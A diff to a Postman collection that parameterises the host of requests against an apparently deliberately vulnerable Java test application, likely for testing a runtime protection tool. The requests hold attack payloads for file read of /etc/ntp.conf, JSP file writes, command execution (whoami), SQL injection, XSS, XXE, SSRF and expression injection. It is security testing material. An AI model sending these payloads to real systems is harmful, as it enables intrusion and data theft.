@@ -20,12 +20,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/fileInputStreamReadFile.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/fileInputStreamReadFile.do?file=/etc/ntp.conf",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -56,7 +56,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/fileInputStreamReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/fileInputStreamReadFile.do"
 									},
 									"response": []
 								},
@@ -71,7 +71,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/fileInputStreamReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/fileInputStreamReadFile.do"
 									},
 									"response": []
 								},
@@ -86,7 +86,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/fileInputStreamReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/header/fileInputStreamReadFile.do"
 									},
 									"response": []
 								},
@@ -104,7 +104,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/fileInputStreamReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/json/fileInputStreamReadFile.do"
 									},
 									"response": []
 								},
@@ -123,7 +123,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/fileInputStreamReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/fileInputStreamReadFile.do"
 									},
 									"response": []
 								}
@@ -138,12 +138,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/randomAccessFileReadFile.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/randomAccessFileReadFile.do?file=/etc/ntp.conf",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -174,7 +174,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/randomAccessFileReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/randomAccessFileReadFile.do"
 									},
 									"response": []
 								},
@@ -189,7 +189,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/randomAccessFileReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/randomAccessFileReadFile.do"
 									},
 									"response": []
 								},
@@ -204,7 +204,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/randomAccessFileReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/header/randomAccessFileReadFile.do"
 									},
 									"response": []
 								},
@@ -222,7 +222,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/randomAccessFileReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/json/randomAccessFileReadFile.do"
 									},
 									"response": []
 								},
@@ -241,7 +241,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/randomAccessFileReadFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/randomAccessFileReadFile.do"
 									},
 									"response": []
 								}
@@ -256,12 +256,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/filesReadAllBytes.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/filesReadAllBytes.do?file=/etc/ntp.conf",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -292,7 +292,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/filesReadAllBytes.do"
+										"url": "http://{{base_url}}/FileSystem/post/filesReadAllBytes.do"
 									},
 									"response": []
 								},
@@ -307,7 +307,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/filesReadAllBytes.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/filesReadAllBytes.do"
 									},
 									"response": []
 								},
@@ -322,7 +322,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/filesReadAllBytes.do"
+										"url": "http://{{base_url}}/FileSystem/header/filesReadAllBytes.do"
 									},
 									"response": []
 								},
@@ -340,7 +340,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/filesReadAllBytes.do"
+										"url": "http://{{base_url}}/FileSystem/json/filesReadAllBytes.do"
 									},
 									"response": []
 								},
@@ -359,7 +359,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/filesReadAllBytes.do"
+										"url": "http://{{base_url}}/FileSystem/post/filesReadAllBytes.do"
 									},
 									"response": []
 								}
@@ -379,12 +379,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/fileOutStreamWriteFile.do?file=test.jsp&content=test",
+											"raw": "http://{{base_url}}/FileSystem/get/fileOutStreamWriteFile.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -424,7 +424,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/fileOutStreamWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/fileOutStreamWriteFile.do"
 									},
 									"response": []
 								},
@@ -439,7 +439,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/fileOutStreamWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/fileOutStreamWriteFile.do"
 									},
 									"response": []
 								},
@@ -459,7 +459,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/fileOutStreamWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/header/fileOutStreamWriteFile.do"
 									},
 									"response": []
 								},
@@ -477,7 +477,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/fileOutStreamWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/json/fileOutStreamWriteFile.do"
 									},
 									"response": []
 								},
@@ -501,7 +501,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/fileOutStreamWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/fileOutStreamWriteFile.do"
 									},
 									"response": []
 								}
@@ -516,12 +516,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/randomAccessFileWriteFile.do?file=test.jsp&content=test",
+											"raw": "http://{{base_url}}/FileSystem/get/randomAccessFileWriteFile.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -561,7 +561,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/randomAccessFileWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/randomAccessFileWriteFile.do"
 									},
 									"response": []
 								},
@@ -576,7 +576,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/randomAccessFileWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/randomAccessFileWriteFile.do"
 									},
 									"response": []
 								},
@@ -596,7 +596,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/randomAccessFileWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/header/randomAccessFileWriteFile.do"
 									},
 									"response": []
 								},
@@ -614,7 +614,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/randomAccessFileWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/json/randomAccessFileWriteFile.do"
 									},
 									"response": []
 								},
@@ -638,7 +638,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/randomAccessFileWriteFile.do"
+										"url": "http://{{base_url}}/FileSystem/post/randomAccessFileWriteFile.do"
 									},
 									"response": []
 								}
@@ -653,12 +653,12 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://localhost:8000/FileSystem/get/filesWrite.do?file=test.jsp&content=test",
+											"raw": "http://{{base_url}}/FileSystem/get/filesWrite.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"localhost"
+												"{{base_host}}"
 											],
-											"port": "8000",
+											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -698,7 +698,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/filesWrite.do"
+										"url": "http://{{base_url}}/FileSystem/post/filesWrite.do"
 									},
 									"response": []
 								},
@@ -713,7 +713,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/cookie/filesWrite.do"
+										"url": "http://{{base_url}}/FileSystem/cookie/filesWrite.do"
 									},
 									"response": []
 								},
@@ -733,7 +733,7 @@
 												"type": "text"
 											}
 										],
-										"url": "http://localhost:8000/FileSystem/header/filesWrite.do"
+										"url": "http://{{base_url}}/FileSystem/header/filesWrite.do"
 									},
 									"response": []
 								},
@@ -751,7 +751,7 @@
 												}
 											}
 										},
-										"url": "http://localhost:8000/FileSystem/json/filesWrite.do"
+										"url": "http://{{base_url}}/FileSystem/json/filesWrite.do"
 									},
 									"response": []
 								},
@@ -775,7 +775,7 @@
 												}
 											]
 										},
-										"url": "http://localhost:8000/FileSystem/post/filesWrite.do"
+										"url": "http://{{base_url}}/FileSystem/post/filesWrite.do"
 									},
 									"response": []
 								}
@@ -792,12 +792,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/FileSystem/get/deleteFile.do?file=./1.txt",
+									"raw": "http://{{base_url}}/FileSystem/get/deleteFile.do?file=./1.txt",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -828,7 +828,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/deleteFile.do"
+								"url": "http://{{base_url}}/FileSystem/post/deleteFile.do"
 							},
 							"response": []
 						},
@@ -843,7 +843,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/cookie/deleteFile.do"
+								"url": "http://{{base_url}}/FileSystem/cookie/deleteFile.do"
 							},
 							"response": []
 						},
@@ -858,7 +858,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/header/deleteFile.do"
+								"url": "http://{{base_url}}/FileSystem/header/deleteFile.do"
 							},
 							"response": []
 						},
@@ -876,7 +876,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/FileSystem/json/deleteFile.do"
+								"url": "http://{{base_url}}/FileSystem/json/deleteFile.do"
 							},
 							"response": []
 						},
@@ -895,7 +895,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/deleteFile.do"
+								"url": "http://{{base_url}}/FileSystem/post/deleteFile.do"
 							},
 							"response": []
 						}
@@ -910,12 +910,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/FileSystem/get/renameTo.do?file=1.txt&dest=1.jsp",
+									"raw": "http://{{base_url}}/FileSystem/get/renameTo.do?file=1.txt&dest=1.jsp",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -955,7 +955,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/renameTo.do"
+								"url": "http://{{base_url}}/FileSystem/post/renameTo.do"
 							},
 							"response": []
 						},
@@ -970,7 +970,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/cookie/renameTo.do"
+								"url": "http://{{base_url}}/FileSystem/cookie/renameTo.do"
 							},
 							"response": []
 						},
@@ -990,7 +990,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/header/renameTo.do"
+								"url": "http://{{base_url}}/FileSystem/header/renameTo.do"
 							},
 							"response": []
 						},
@@ -1008,7 +1008,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/FileSystem/json/renameTo.do"
+								"url": "http://{{base_url}}/FileSystem/json/renameTo.do"
 							},
 							"response": []
 						},
@@ -1032,7 +1032,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/renameTo.do"
+								"url": "http://{{base_url}}/FileSystem/post/renameTo.do"
 							},
 							"response": []
 						}
@@ -1047,12 +1047,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/FileSystem/get/filesCopy.do?file=1.txt&dest=1.jsp",
+									"raw": "http://{{base_url}}/FileSystem/get/filesCopy.do?file=1.txt&dest=1.jsp",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -1092,7 +1092,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/filesCopy.do"
+								"url": "http://{{base_url}}/FileSystem/post/filesCopy.do"
 							},
 							"response": []
 						},
@@ -1107,7 +1107,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/cookie/filesCopy.do"
+								"url": "http://{{base_url}}/FileSystem/cookie/filesCopy.do"
 							},
 							"response": []
 						},
@@ -1127,7 +1127,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/header/filesCopy.do"
+								"url": "http://{{base_url}}/FileSystem/header/filesCopy.do"
 							},
 							"response": []
 						},
@@ -1145,7 +1145,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/FileSystem/json/filesCopy.do"
+								"url": "http://{{base_url}}/FileSystem/json/filesCopy.do"
 							},
 							"response": []
 						},
@@ -1169,7 +1169,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/filesCopy.do"
+								"url": "http://{{base_url}}/FileSystem/post/filesCopy.do"
 							},
 							"response": []
 						}
@@ -1184,12 +1184,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/FileSystem/get/listFile.do?dir=/usr",
+									"raw": "http://{{base_url}}/FileSystem/get/listFile.do?dir=/usr",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -1220,7 +1220,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/listFile.do"
+								"url": "http://{{base_url}}/FileSystem/post/listFile.do"
 							},
 							"response": []
 						},
@@ -1235,7 +1235,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/cookie/listFile.do"
+								"url": "http://{{base_url}}/FileSystem/cookie/listFile.do"
 							},
 							"response": []
 						},
@@ -1250,7 +1250,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/FileSystem/header/listFile.do"
+								"url": "http://{{base_url}}/FileSystem/header/listFile.do"
 							},
 							"response": []
 						},
@@ -1268,7 +1268,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/FileSystem/json/listFile.do"
+								"url": "http://{{base_url}}/FileSystem/json/listFile.do"
 							},
 							"response": []
 						},
@@ -1287,7 +1287,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/FileSystem/post/listFile.do"
+								"url": "http://{{base_url}}/FileSystem/post/listFile.do"
 							},
 							"response": []
 						}
@@ -1307,12 +1307,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/CMD/get/cmd.do?cmd=whoami",
+									"raw": "http://{{base_url}}/CMD/get/cmd.do?cmd=whoami",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"CMD",
 										"get",
@@ -1343,7 +1343,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/CMD/post/cmd.do"
+								"url": "http://{{base_url}}/CMD/post/cmd.do"
 							},
 							"response": []
 						},
@@ -1358,7 +1358,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/CMD/cookie/cmd.do"
+								"url": "http://{{base_url}}/CMD/cookie/cmd.do"
 							},
 							"response": []
 						},
@@ -1373,7 +1373,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/CMD/header/cmd.do"
+								"url": "http://{{base_url}}/CMD/header/cmd.do"
 							},
 							"response": []
 						},
@@ -1391,7 +1391,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/CMD/json/cmd.do"
+								"url": "http://{{base_url}}/CMD/json/cmd.do"
 							},
 							"response": []
 						},
@@ -1410,7 +1410,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/CMD/post/cmd.do"
+								"url": "http://{{base_url}}/CMD/post/cmd.do"
 							},
 							"response": []
 						}
@@ -1425,12 +1425,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/CMD/get/unixProcess.do?cmd=whoami",
+									"raw": "http://{{base_url}}/CMD/get/unixProcess.do?cmd=whoami",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"CMD",
 										"get",
@@ -1461,7 +1461,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/CMD/post/unixProcess.do"
+								"url": "http://{{base_url}}/CMD/post/unixProcess.do"
 							},
 							"response": []
 						},
@@ -1476,7 +1476,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/CMD/cookie/unixProcess.do"
+								"url": "http://{{base_url}}/CMD/cookie/unixProcess.do"
 							},
 							"response": []
 						},
@@ -1491,7 +1491,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/CMD/header/unixProcess.do"
+								"url": "http://{{base_url}}/CMD/header/unixProcess.do"
 							},
 							"response": []
 						},
@@ -1509,7 +1509,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/CMD/json/unixProcess.do"
+								"url": "http://{{base_url}}/CMD/json/unixProcess.do"
 							},
 							"response": []
 						},
@@ -1528,7 +1528,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/CMD/post/unixProcess.do"
+								"url": "http://{{base_url}}/CMD/post/unixProcess.do"
 							},
 							"response": []
 						}
@@ -1545,12 +1545,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:8000/SQL/get/sql.do?username='/**/or/**/username='root",
+							"raw": "http://{{base_url}}/SQL/get/sql.do?username='/**/or/**/username='root",
 							"protocol": "http",
 							"host": [
-								"localhost"
+								"{{base_host}}"
 							],
-							"port": "8000",
+							"port": "{{base_port}}",
 							"path": [
 								"SQL",
 								"get",
@@ -1581,7 +1581,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/SQL/post/sql.do"
+						"url": "http://{{base_url}}/SQL/post/sql.do"
 					},
 					"response": []
 				},
@@ -1596,7 +1596,7 @@
 								"type": "text"
 							}
 						],
-						"url": "http://localhost:8000/SQL/cookie/sql.do"
+						"url": "http://{{base_url}}/SQL/cookie/sql.do"
 					},
 					"response": []
 				},
@@ -1611,7 +1611,7 @@
 								"type": "text"
 							}
 						],
-						"url": "http://localhost:8000/SQL/header/sql.do"
+						"url": "http://{{base_url}}/SQL/header/sql.do"
 					},
 					"response": []
 				},
@@ -1629,7 +1629,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/SQL/json/sql.do"
+						"url": "http://{{base_url}}/SQL/json/sql.do"
 					},
 					"response": []
 				},
@@ -1648,7 +1648,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/SQL/post/sql.do"
+						"url": "http://{{base_url}}/SQL/post/sql.do"
 					},
 					"response": []
 				}
@@ -1663,12 +1663,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:8000/XSS/get/xss.do?str=<script>alert(document.cookie)</script>",
+							"raw": "http://{{base_url}}/XSS/get/xss.do?str=<script>alert(document.cookie)</script>",
 							"protocol": "http",
 							"host": [
-								"localhost"
+								"{{base_host}}"
 							],
-							"port": "8000",
+							"port": "{{base_port}}",
 							"path": [
 								"XSS",
 								"get",
@@ -1699,7 +1699,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/XSS/post/xss.do"
+						"url": "http://{{base_url}}/XSS/post/xss.do"
 					},
 					"response": []
 				},
@@ -1714,7 +1714,7 @@
 								"type": "text"
 							}
 						],
-						"url": "http://localhost:8000/XSS/cookie/xss.do"
+						"url": "http://{{base_url}}/XSS/cookie/xss.do"
 					},
 					"response": []
 				},
@@ -1729,7 +1729,7 @@
 								"type": "text"
 							}
 						],
-						"url": "http://localhost:8000/XSS/header/xss.do"
+						"url": "http://{{base_url}}/XSS/header/xss.do"
 					},
 					"response": []
 				},
@@ -1747,7 +1747,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/XSS/json/xss.do"
+						"url": "http://{{base_url}}/XSS/json/xss.do"
 					},
 					"response": []
 				},
@@ -1766,7 +1766,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/XSS/post/xss.do"
+						"url": "http://{{base_url}}/XSS/post/xss.do"
 					},
 					"response": []
 				}
@@ -1789,7 +1789,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Expression/ongl.do"
+						"url": "http://{{base_url}}/Expression/ongl.do"
 					},
 					"response": []
 				},
@@ -1807,7 +1807,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Expression/spEL.do"
+						"url": "http://{{base_url}}/Expression/spEL.do"
 					},
 					"response": []
 				},
@@ -1825,7 +1825,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Expression/mvel.do"
+						"url": "http://{{base_url}}/Expression/mvel.do"
 					},
 					"response": []
 				},
@@ -1835,12 +1835,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://localhost:8000/rasp.action?redirect:https://www.baidu.com/",
+							"raw": "http://{{base_url}}/rasp.action?redirect:https://www.baidu.com/",
 							"protocol": "http",
 							"host": [
-								"localhost"
+								"{{base_host}}"
 							],
-							"port": "8000",
+							"port": "{{base_port}}",
 							"path": [
 								"rasp.action"
 							],
@@ -1879,7 +1879,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/modules/webshell/Customize.jsp"
+						"url": "http://{{base_url}}/modules/webshell/Customize.jsp"
 					},
 					"response": []
 				}
@@ -1908,7 +1908,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/FileUpload/upload.do"
+						"url": "http://{{base_url}}/FileUpload/upload.do"
 					},
 					"response": []
 				}
@@ -1937,7 +1937,7 @@
 								}
 							]
 						},
-						"url": "http://localhost:8000/modules/jni/loadlibrary.jsp"
+						"url": "http://{{base_url}}/modules/jni/loadlibrary.jsp"
 					},
 					"response": []
 				}
@@ -1951,7 +1951,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": "http://localhost:8000/Deserialization/readObject.do"
+						"url": "http://{{base_url}}/Deserialization/readObject.do"
 					},
 					"response": []
 				},
@@ -1969,7 +1969,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Deserialization/readObject.do"
+						"url": "http://{{base_url}}/Deserialization/readObject.do"
 					},
 					"response": []
 				}
@@ -1998,7 +1998,7 @@
 								}
 							}
 						},
-						"url": "http://localhost:8000/Test/test.do"
+						"url": "http://{{base_url}}/Test/test.do"
 					},
 					"response": []
 				},
@@ -2014,12 +2014,12 @@
 							}
 						],
 						"url": {
-							"raw": "http://localhost:8000/Test/test.do?name=test",
+							"raw": "http://{{base_url}}/Test/test.do?name=test",
 							"protocol": "http",
 							"host": [
-								"localhost"
+								"{{base_host}}"
 							],
-							"port": "8000",
+							"port": "{{base_port}}",
 							"path": [
 								"Test",
 								"test.do"
@@ -2048,12 +2048,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/XXE/get/xerces.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
+									"raw": "http://{{base_url}}/XXE/get/xerces.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"XXE",
 										"get",
@@ -2084,7 +2084,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/XXE/post/xerces.do"
+								"url": "http://{{base_url}}/XXE/post/xerces.do"
 							},
 							"response": []
 						},
@@ -2099,7 +2099,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/XXE/cookie/xerces.do"
+								"url": "http://{{base_url}}/XXE/cookie/xerces.do"
 							},
 							"response": []
 						},
@@ -2114,7 +2114,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/XXE/header/xerces.do"
+								"url": "http://{{base_url}}/XXE/header/xerces.do"
 							},
 							"response": []
 						},
@@ -2132,7 +2132,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/XXE/json/xerces.do"
+								"url": "http://{{base_url}}/XXE/json/xerces.do"
 							},
 							"response": []
 						},
@@ -2151,7 +2151,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/XXE/post/xerces.do"
+								"url": "http://{{base_url}}/XXE/post/xerces.do"
 							},
 							"response": []
 						}
@@ -2166,12 +2166,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/XXE/get/dom4j.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><name>%26title%3b<%2fname><%2farticle>",
+									"raw": "http://{{base_url}}/XXE/get/dom4j.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><name>%26title%3b<%2fname><%2farticle>",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"XXE",
 										"get",
@@ -2202,7 +2202,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/XXE/post/dom4j.do"
+								"url": "http://{{base_url}}/XXE/post/dom4j.do"
 							},
 							"response": []
 						},
@@ -2217,7 +2217,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/XXE/cookie/dom4j.do"
+								"url": "http://{{base_url}}/XXE/cookie/dom4j.do"
 							},
 							"response": []
 						},
@@ -2232,7 +2232,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/XXE/header/dom4j.do"
+								"url": "http://{{base_url}}/XXE/header/dom4j.do"
 							},
 							"response": []
 						},
@@ -2250,7 +2250,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/XXE/json/dom4j.do"
+								"url": "http://{{base_url}}/XXE/json/dom4j.do"
 							},
 							"response": []
 						},
@@ -2269,7 +2269,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/XXE/post/dom4j.do"
+								"url": "http://{{base_url}}/XXE/post/dom4j.do"
 							},
 							"response": []
 						}
@@ -2289,12 +2289,12 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://localhost:8000/SSRF/get/httpConnection.do?url=https://www.baidu.com",
+									"raw": "http://{{base_url}}/SSRF/get/httpConnection.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"localhost"
+										"{{base_host}}"
 									],
-									"port": "8000",
+									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2325,7 +2325,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/httpConnection.do"
+								"url": "http://{{base_url}}/SSRF/post/httpConnection.do"
 							},
 							"response": []
 						},
@@ -2340,7 +2340,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/cookie/httpConnection.do"
+								"url": "http://{{base_url}}/SSRF/cookie/httpConnection.do"
 							},
 							"response": []
 						},
@@ -2355,7 +2355,7 @@
 										"type": "text"
 									}
 								],
-								"url": "http://localhost:8000/SSRF/header/httpConnection.do"
+								"url": "http://{{base_url}}/SSRF/header/httpConnection.do"
 							},
 							"response": []
 						},
@@ -2373,7 +2373,7 @@
 										}
 									}
 								},
-								"url": "http://localhost:8000/SSRF/json/httpConnection.do"
+								"url": "http://{{base_url}}/SSRF/json/httpConnection.do"
 							},
 							"response": []
 						},
@@ -2392,7 +2392,7 @@
 										}
 									]
 								},
-								"url": "http://localhost:8000/SSRF/post/httpConnection.do"
